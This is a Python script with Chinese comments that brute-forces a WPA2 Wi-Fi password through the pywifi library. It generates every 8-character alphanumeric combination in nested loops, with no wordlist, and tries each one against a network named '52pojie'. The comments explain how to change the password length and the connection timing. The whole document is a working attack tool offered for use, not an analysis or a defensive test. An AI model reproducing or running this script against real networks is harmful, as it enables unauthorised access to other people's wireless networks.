#不生成密码本破解：
#8位数字字母密码破解：
import time,pywifi
from pywifi import const#引用一些定义
class PoJie:
    def __init__(self):
        wifi=pywifi.PyWiFi()#抓取网卡接口
        self.iface=wifi.interfaces()[0]#抓取第一个无线网卡
        self.iface.disconnect()#测试链接断开所有链接
        time.sleep(1)#休眠1秒
        #测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
    def readPassWord(self):
        str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'#这里加上你想要的字符
        print('开始破解：')
        for a in range(len(str)):
            for b in range(len(str)):
                for c in range(len(str)):
                    for d in range(len(str)):
                        for e in range(len(str)):
                            for f in range(len(str)):
                                for g in range(len(str)):
                                    for h in range(len(str)):
                                        myStr = str[a] + str[b] + str[c] + str[d] + str[e] + str[f] + str[g] + str[h]# 生成8位数字字母密码，通过增加/删除for语句并且在这句后面加上/删除相应的str来自定义密码位数
                                        bool1 = self.test_connect(myStr)
                                        if bool1:
                                            print('密码正确：', myStr)
                                            ent=time.time()
                                            print('破解成功！用时%f分'%((ent - stm)/60))
                                            return
                                        else:
                                            print('密码错误：' + myStr)
        ent=time.time()
        print('破解失败，用时%f分'%((ent - stm)/60))
    def test_connect(self,findStr):#测试链接
        profile=pywifi.Profile()#创建wifi链接文件
        profile.ssid='52pojie'#wifi名称
        profile.auth=const.AUTH_ALG_OPEN#网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher=const.CIPHER_TYPE_CCMP#加密单元
        profile.key=findStr#密码
        self.iface.remove_all_network_profiles()#删除所有的wifi文件
        tmp_profile=self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(5)#这里可以更改链接所需要的时间，单位是秒
        if self.iface.status()==const.IFACE_CONNECTED:#判断是否连接上
            isOK=True
        else:
            isOK=False
        self.iface.disconnect()#断开
        time.sleep(1)#这里可以更改断开链接所需要的时间，单位是秒
        #检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
        return isOK
stm=time.time()
PoJie().readPassWord()